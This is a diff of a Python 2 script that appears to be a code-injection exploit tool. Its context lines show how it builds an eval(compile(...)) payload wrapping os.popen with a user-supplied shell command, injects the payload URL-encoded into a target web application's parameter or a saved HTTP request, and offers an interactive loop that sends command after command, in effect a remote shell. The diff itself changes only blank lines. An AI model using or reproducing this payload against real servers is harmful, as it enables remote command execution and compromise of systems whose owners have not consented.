@@ -6,8 +6,6 @@
           
 """
 
-
-
 import requests, re, optparse, urllib, os
 
 #Taken from http://stackoverflow.com/questions/2115410/does-python-have-a-module-for-parsing-http-requests-and-responses
@@ -25,8 +23,6 @@ class HTTPRequest(BaseHTTPRequestHandler):
         self.error_code = code
         self.error_message = message
 
-
-
 def parse_url(command,user_url,user_param=None):
     print user_param
     insert = '''eval(compile("""for x in range(1):\\n import os\\n print("-"*50)\\n os.popen(r'%s').read()""",'PyCodeInjectionShell','single'))''' % command
@@ -42,9 +38,6 @@ def parse_url(command,user_url,user_param=None):
         split_user_url = user_url.split("%s=" % user_param)
         suffix = split_user_url[1].split('&')[1]
         url = '%s%s=%s&%s' % (split_user_url[0],user_param,encoded,suffix)
-
-    
-    
     print("URL sent to server: " + url)
     return url
 
@@ -56,7 +49,6 @@ def parse_request(command,filename,user_param=None):
         request1 = file.read()
         #req_obj = HTTPRequest(request1)      
         if user_param == None:
-            
             acceptline = re.search('Accept:.*',request1)
             #print str(acceptline.group(0))
             updated = re.sub("\*",encoded, request1)
@@ -74,9 +66,7 @@ def parse_request(command,filename,user_param=None):
         elif req_obj.command == "POST":
             content_len = int(req_obj.headers.getheader('content-length', 0))
             post_body = req_obj.rfile.read(content_len)
-            
             return url,req_obj.headers,post_body
-
 
 def select_command(user_url,user_param=None):
     print user_param
@@ -94,9 +84,7 @@ def select_command(user_url,user_param=None):
     response = requests.get(url)
     #print response.headers
     #print response.content
-     
     match = re.search('([---------------------------------------------------][\n])(.*)',response.content)
-
     #print match
     try:
         command_output = str(match.group(0))
@@ -145,19 +133,12 @@ def send_request(url,command,headers=None,data=None):
         print response.content
         return error
 
-
-
-
-
-
 # Ripped from https://raw.githubusercontent.com/sqlmapproject/sqlmap/044f05e772d0787489bdf7bc220a5dfc76714b1d/lib/core/common.py
 def checkFile(filename, raiseOnError=True):
     """
     Checks for file existence and readability
     """
-
     valid = True
-
     try:
         if filename is None or not os.path.isfile(filename):
             valid = False
@@ -199,7 +180,6 @@ if __name__ == '__main__':
         print "Either enter a URL or a request file, but not both."
         exit()
 
-
     if (options.url) and (options.parameter):
         print("URL entered by user: " + options.url)
         parsed_url = parse_url(options.cmd,options.url,options.parameter)
@@ -211,10 +191,8 @@ if __name__ == '__main__':
                 url = parse_url(new_cmd,options.url,options.parameter)
                 send_request(url,new_cmd)
 
-
     if (options.url) and not (options.parameter):
         print("URL entered by user: " + options.url)
-
         parsed_url = parse_url(options.cmd,options.url,options.parameter)
         send_request(parsed_url,options.cmd)
         if (options.interactive):            
@@ -222,7 +200,6 @@ if __name__ == '__main__':
                 new_cmd = raw_input("Command:")
                 url = parse_url(new_cmd,options.url,options.parameter)
                 send_request(url,new_cmd)
-                
 
     if (options.request):
         checkFile(options.request)
@@ -233,9 +210,3 @@ if __name__ == '__main__':
                 new_cmd = raw_input("Command:")
                 parsed_url,headers,data = parse_request(new_cmd,options.request,options.parameter)
                 send_request(parsed_url,options.cmd,headers,data)
-
-
-
-
-        
-
